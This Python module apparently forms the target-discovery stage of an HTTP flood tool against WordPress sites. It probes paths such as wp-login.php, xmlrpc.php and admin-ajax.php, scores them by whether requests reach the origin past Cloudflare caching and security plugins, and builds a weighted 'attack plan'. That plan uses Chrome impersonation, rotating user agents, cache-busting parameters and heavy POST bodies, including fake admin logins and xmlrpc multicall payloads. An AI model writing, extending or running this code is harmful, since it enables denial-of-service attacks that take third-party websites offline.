import asyncio
import random
import logging
from typing import List, Dict, Tuple, Optional
from dataclasses import dataclass, field
from urllib.parse import urlparse, urljoin, urlencode

logger = logging.getLogger("endpoint_engine")

PROBE_PATHS = [
    "/", "/robots.txt", "/wp-cron.php", "/wp-content/", "/wp-includes/",
    "/wp-json/wp/v2/posts", "/wp-json/wp/v2/users", "/?s=test",
    "/?p=1", "/?page_id=1", "/wp-login.php", "/xmlrpc.php",
    "/wp-admin/admin-ajax.php", "/feed/", "/comments/feed/",
    "/sitemap.xml",
]

POST_PATHS = [
    ("/wp-login.php", {"log": "admin", "pwd": "test{rand}"}),
    ("/?s={rand}", {}),
    ("/xmlrpc.php", {"payload": "system.listMethods"}),
    ("/wp-admin/admin-ajax.php", {"action": "heartbeat"}),
]

STATIC_EXT = {".jpg", ".jpeg", ".png", ".gif", ".css", ".js", ".ico", ".svg", ".woff", ".woff2", ".ttf"}


@dataclass
class EndpointInfo:
    path: str
    method: str = "GET"
    status: int = 0
    body_len: int = 0
    blocked: bool = False
    reached_origin: bool = False
    is_dynamic: bool = False
    weight: float = 0.0
    post_data: Optional[dict] = None
    content_type: str = ""


@dataclass
class AttackVector:
    endpoints: List[EndpointInfo] = field(default_factory=list)
    cache_busters: List[str] = field(default_factory=list)
    user_agents: List[str] = field(default_factory=list)


class SmartEndpointDiscovery:
    def __init__(self, timeout: int = 5):
        self.timeout = timeout
        self.vectors: List[EndpointInfo] = []
        self._ua_pool = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15 Safari/605.1.15",
            "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 Chrome/124 Mobile Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120 Safari/537.36",
        ]

    async def probe(self, target_url: str) -> List[EndpointInfo]:
        logger.info("Probing %s for working endpoints...", target_url)
        self.vectors = []
        from curl_cffi.requests import Session

        base = target_url.rstrip("/")
        if not base.startswith("http"):
            base = "https://" + base

        def _test_sync(path: str, method: str = "GET", data: Optional[str] = None) -> Optional[EndpointInfo]:
            try:
                s = Session(impersonate="chrome124", timeout=self.timeout)
                ua = random.choice(self._ua_pool)
                hdrs = {"User-Agent": ua}
                ct = "application/x-www-form-urlencoded"
                if data and "xml" in str(data):
                    ct = "text/xml"
                resp = s.request(method, base + path, headers=hdrs, data=data, timeout=self.timeout)
                bl = resp.text[:300].lower()
                blocked = "malcare" in bl or "security" in bl
                dyn = resp.headers.get("cf-cache-status", "") != "HIT"
                origin = resp.headers.get("cf-cache-status", "") == "DYNAMIC" or resp.status_code != 200
                ep = EndpointInfo(
                    path=path, method=method, status=resp.status_code,
                    body_len=len(resp.text), blocked=blocked,
                    reached_origin=origin, is_dynamic=dyn,
                    weight=self._calc_weight(resp.status_code, len(resp.text), blocked, dyn),
                )
                s.close()
                return ep
            except Exception:
                return None

        loop = asyncio.get_event_loop()
        tasks = []
        for path in PROBE_PATHS:
            tasks.append(loop.run_in_executor(None, _test_sync, path, "GET"))
            if path in ["/", "/wp-login.php", "/xmlrpc.php"]:
                tasks.append(loop.run_in_executor(None, _test_sync, path, "POST", "test=1"))
            if path in ["/wp-cron.php", "/robots.txt"]:
                tasks.append(loop.run_in_executor(None, _test_sync, path, "HEAD"))
        results = await asyncio.gather(*tasks, return_exceptions=True)
        seen = set()
        for r in results:
            if isinstance(r, EndpointInfo):
                key = (r.path, r.method)
                if key not in seen:
                    seen.add(key)
                    self.vectors.append(r)
        self.vectors.sort(key=lambda v: v.weight, reverse=True)
        logger.info("Probe done: %d vectors found (best: %s %s W=%.1f)",
                     len(self.vectors),
                     self.vectors[0].method if self.vectors else "?",
                     self.vectors[0].path if self.vectors else "?",
                     self.vectors[0].weight if self.vectors else 0)
        return self.vectors

    def _calc_weight(self, status: int, body_len: int, blocked: bool, dynamic: bool) -> float:
        w = 0.0
        if status in (200, 301, 302):
            w += 50
        elif status in (401, 403, 405):
            w += 30
        elif status in (404,):
            w += 5
        if blocked:
            w += 10
        if dynamic:
            w += 20
        if body_len > 500:
            w += body_len / 100
        return w

    def get_heavy_endpoints(self, top_n: int = 5) -> List[EndpointInfo]:
        return self.vectors[:top_n]

    def _gen_post_data(self, path: str) -> Optional[Tuple[str, str]]:
        r = random.randint
        big = "x" * 1024
        posts = {
            "/": (("log=admin&pwd=test%d&redirect_to=/?_cb=%d" % (r(1,9999), r(100,999)),
                   "application/x-www-form-urlencoded")),
            "/wp-login.php": (("log=admin_%d&pwd=test_%d&wp-submit=Log+In"
                               "&redirect_to=/wp-admin/&test=%s" % (r(1,999), r(1,999), big[:256]),
                               "application/x-www-form-urlencoded")),
            "/xmlrpc.php": (('<?xml version="1.0"?><methodCall><methodName>system.multicall</methodName>'
                             '<params><param><value><struct><member><name>methodName</name><value><string>'
                             'wp.getPost</string></value></member><member><name>params</name><value>'
                             '<array><data><value><string>admin</string></value><value><string>test</string>'
                             '</value></data></array></value></member></struct></value></param></params>'
                             '</methodCall>', "text/xml")),
            "/?s={rand}": (("s=%s" % big[:256], "application/x-www-form-urlencoded")),
            "/wp-admin/admin-ajax.php": (("action=heartbeat&screen_id=front&_nonce=%s&data[wp-refresh-post-nonces]"
                                          "[keep_alive]=1&data[server_time]=%d" % (r(100,999), r(100000,999999)),
                                          "application/x-www-form-urlencoded")),
        }
        for k, v in posts.items():
            pattern = k.split("{")[0].rstrip("?")
            if path.startswith(pattern):
                return v
        search_path = "/?s="
        if search_path in path or "?s=" in path:
            return (("s=%s" % big[:512], "application/x-www-form-urlencoded"))
        return None

    def generate_attack_plan(self) -> List[Dict]:
        plan = []
        for ep in self.vectors[:8]:
            plan.append({
                "path": ep.path,
                "method": ep.method,
                "weight": ep.weight,
                "blocked": ep.blocked,
            })
            if ep.method == "GET":
                pdata = self._gen_post_data(ep.path)
                plan.append({
                    "path": ep.path,
                    "method": "POST",
                    "weight": ep.weight * 1.5,
                    "blocked": ep.blocked,
                    "post_data": pdata[0] if pdata else "test=1",
                    "content_type": pdata[1] if pdata else "application/x-www-form-urlencoded",
                })
        plan.sort(key=lambda p: p["weight"], reverse=True)
        return plan

    def random_endpoint(self, plan: List[Dict]) -> Tuple[str, str, bool]:
        if not plan:
            return "/", "GET", False
        total = sum(p["weight"] for p in plan)
        r = random.uniform(0, total)
        cum = 0
        for p in plan:
            cum += p["weight"]
            if r <= cum:
                path = p["path"]
                method = p["method"]
                if "{rand}" in path:
                    path = path.replace("{rand}", str(random.randint(1, 99999)))
                return path, method, p["blocked"]
        last = plan[-1]
        return last["path"], last["method"], last["blocked"]

    def random_post_data(self, path: str) -> Optional[Tuple[str, str]]:
        data_map = {
            "/wp-login.php": ("log=admin&pwd=test%d&wp-submit=Login" % random.randint(100, 999), "application/x-www-form-urlencoded"),
            "/xmlrpc.php": ('<?xml version="1.0"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value><string>admin</string></value></param><param><value><string>test</string></value></param></params></methodCall>', "text/xml"),
            "/wp-admin/admin-ajax.php": ("action=heartbeat&_nonce=test&data=" + str(random.randint(1, 99999)), "application/x-www-form-urlencoded"),
        }
        return data_map.get(path)

    def cache_bust(self, path: str) -> str:
        if "?" in path:
            return path + "&_=" + str(random.randint(100000, 999999))
        return path + "?_=" + str(random.randint(100000, 999999))
